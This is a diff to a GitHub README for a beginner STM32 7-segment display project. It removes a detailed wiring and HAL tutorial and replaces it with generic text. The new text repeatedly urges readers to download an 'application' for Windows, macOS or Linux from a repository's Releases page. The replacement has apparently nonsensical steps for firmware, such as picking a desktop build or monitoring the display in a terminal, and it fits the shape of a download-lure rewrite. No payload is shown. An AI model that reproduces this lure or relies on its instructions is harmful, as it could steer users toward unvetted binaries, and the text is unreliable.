@@ -1,190 +1,67 @@
-# 🔢 STM32 7-Segment Display Interfacing (HAL Coding Method)
-
-A **beginner-friendly STM32 project** that demonstrates how to interface a **7-segment display** using **STM32 HAL (Hardware Abstraction Layer)** in **STM32CubeIDE**.
-
-This repository focuses on:
-
-* Clean GPIO configuration using HAL
-* Clear segment-to-pin mapping
-* Logical digit control (0–9)
-* Industry-style embedded project structure
-
----
-
-## 🎯 Project Objective
-
-To display digits **0 → 9** on a **7-segment display** by controlling individual LED segments using STM32 GPIO pins via HAL APIs.
-
-This project builds a **strong foundation** for:
-
-* GPIO fundamentals
-* Display interfacing concepts
-* Transitioning from Arduino-style coding to professional STM32 workflows
-
----
-
-## 🧠 What You’ll Learn
-
-By completing this project, you will understand:
-
-* How a 7-segment display works internally
-* How STM32 GPIO pins control external hardware
-* How HAL abstracts register-level complexity
-* Pin planning and wiring best practices
-* Embedded logic mapping (digit → segment pattern)
-
----
-
-## 🧰 Hardware & Software Requirements
-
-### Hardware
-
-* STM32 Board (e.g., **STM32F446RE Nucleo**)
-* Single-digit **7-segment display**
-* 220Ω–330Ω resistors (7 numbers)
-* Breadboard & jumper wires
-
-### Software
-
-* STM32CubeIDE
-* STM32 HAL drivers
-* ST-Link (onboard or external)
-
----
-
-## 🔌 Pinout & Hardware Connections
-
-> ⚠️ Display Type Assumption: **COMMON CATHODE**
-> (If you use a Common Anode display, logic must be inverted)
-
-### 📍 Segment-to-STM32 Pin Mapping
-
-| Segment | Description  | STM32 GPIO | Nucleo Pin |
-| ------- | ------------ | ---------- | ---------- |
-| a       | Top          | PA0        | D7         |
-| b       | Top-Right    | PA1        | D8         |
-| c       | Bottom-Right | PA2        | D9         |
-| d       | Bottom       | PA3        | D10        |
-| e       | Bottom-Left  | PA4        | D11        |
-| f       | Top-Left     | PA5        | D12        |
-| g       | Middle       | PA6        | D13        |
-
-**Common Cathode Pin → GND**
-
----
-
-### 🔍 Why D7–D13?
-
-* Digital-only pins (no analog confusion)
-* Physically continuous on Nucleo boards
-* Cleaner breadboard wiring
-* Beginner-friendly visibility
-
-This is **intentional hardware design**, not random pin picking.
-
----
-
-### 🔥 Current-Limiting Resistors (Mandatory)
-
-Each segment **must** use a resistor.
-
-```
-STM32 Pin → 220Ω → Segment Pin
-```
-
-Skipping resistors risks:
-
-* Burning LED segments
-* Permanent STM32 GPIO damage
-
----
-
-## ⚙️ STM32CubeMX GPIO Configuration
-
-Configure **PA0–PA6** as:
-
-* Mode: `GPIO_Output`
-* Output Type: `Push-Pull`
-* Pull-up/Pull-down: `No Pull`
-* Speed: `Low / Medium`
-
-HAL will generate the GPIO init code automatically.
-
----
-
-## 🧮 Display Logic (Common Cathode)
-
-| GPIO State | Segment |
-| ---------- | ------- |
-| HIGH (1)   | ON      |
-| LOW (0)    | OFF     |
-
----
-
-## 🧑‍💻 Core Code Concept
-
-Each number (0–9) is represented by a **bit pattern**, deciding which segments turn ON.
-
-Example:
-
-* Digit **0** → a b c d e f ON
-* Digit **1** → b c ON
-* Digit **8** → all segments ON
-
-The logic is implemented cleanly using HAL GPIO writes.
-
----
-
-## 🚀 Program Flow
-
-1. Initialize HAL
-2. Configure system clock
-3. Initialize GPIO pins
-4. Select digit pattern
-5. Set GPIO pins accordingly
-6. Delay
-7. Repeat
-
----
-
-## 🧪 Common Issues & Fixes
-
-| Issue          | Likely Cause            |
-| -------------- | ----------------------- |
-| Nothing lights | COM pin not grounded    |
-| Wrong number   | Segment wiring mismatch |
-| Inverted logic | Using Common Anode      |
-| Dim display    | Missing resistors       |
-
----
-
-## 📦 Project Structure
-
-```
-Core/
- ├── Src/
- │   └── main.c
- └── Inc/
-     └── main.h
-```
-
-Simple. Clean. Beginner-friendly.
-
----
-
-## 🧭 Next Enhancements (Ideas)
-
-* Button-controlled digit increment/decrement
-* Multi-digit multiplexing
-* Timer-based display refresh
-* Register-level version (HAL → Bare-metal)
-
----
-
-## 📜 License
-
-This project is licensed under the **MIT License**.
-You are free to use, modify, and distribute it.
-
----
-
+# 🌟 STM32-7-Segment-Display-HAL-Coding-Method - Easy Interface for Beginners
+
+## 📥 Download the Latest Version
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/ScoobyMfdoo/STM32-7-Segment-Display-HAL-Coding-Method/releases)
+
+## 📚 Description
+This project is designed to help beginners learn how to use STM32 to control a 7-segment display. It makes use of STM32 HAL (Hardware Abstraction Layer) within the STM32CubeIDE environment. By using this project, you will see how the appropriate GPIO pins function to manage the display, making it a practical starting point for STM32 applications.
+
+## 🚀 Getting Started
+To get started with the STM32-7-Segment-Display-HAL-Coding-Method, follow these steps:
+
+### 1. System Requirements
+- **Operating System:** Windows, macOS, or Linux
+- **Development Environment:** STM32CubeIDE installed on your computer
+- **STM32 Board:** STM32F446RE or compatible
+- **USB Driver:** STM32 USB driver for your system
+
+### 2. Download & Install
+To download the application, visit the [Releases page](https://github.com/ScoobyMfdoo/STM32-7-Segment-Display-HAL-Coding-Method/releases).
+
+1. Click on the link to go to the GitHub Releases page.
+2. Locate the latest version listed at the top.
+3. Click on the appropriate download link for your system.
+
+### 3. Setting Up STM32CubeIDE
+1. Open STM32CubeIDE on your computer.
+2. Create a new STM32 project and select the STM32F446RE board.
+3. Configure the project settings:
+   - Select the STM32 HAL as the library.
+   - Import the downloaded project files into your new STM32CubeIDE project.
+
+### 4. Connecting Your Device
+1. Use a USB cable to connect the STM32 board to your computer.
+2. Make sure the board is powered on.
+3. Verify that your computer recognizes the board by checking the device manager.
+
+### 5. Running the Application
+1. In STM32CubeIDE, build your project to ensure there are no errors.
+2. Once built successfully, upload the application to the STM32 board.
+3. Open a terminal to monitor the display output.
+4. Your 7-segment display should now be ready to use.
+
+## 🔍 Features
+- Interfaces with common-cathode 7-segment displays.
+- Utilizes GPIO pins for easy wiring.
+- Provides clear output for beginners learning STM32.
+- Example code included for quick start.
+
+## 🛠️ How It Works
+The application utilizes GPIO pins to control each segment of the display. It sends signals through the STM32 HAL to light up the segments in different patterns based on your code. This hands-on approach allows users to visualize the workings of microcontrollers in a straightforward way.
+
+## 📓 Topics Covered
+- 7-segment display
+- Common-cathode setup
+- GPIO pin configuration
+- STM32 HAL
+- STM32CubeIDE setup
+
+## 🌐 Community & Support
+If you have questions or need help, consider checking out the community forums related to STM32 development. Engaging with other learners can help you solve issues and learn best practices.
+
+## 💡 Tips
+- Ensure your connections are secure before powering the board.
+- Review example code carefully to understand the logic.
+- Experiment with different display patterns to enhance your learning.
+
+For more details, documentation, and the latest updates, always refer back to the [Releases page](https://github.com/ScoobyMfdoo/STM32-7-Segment-Display-HAL-Coding-Method/releases). Enjoy your journey with STM32 and 7-segment displays!
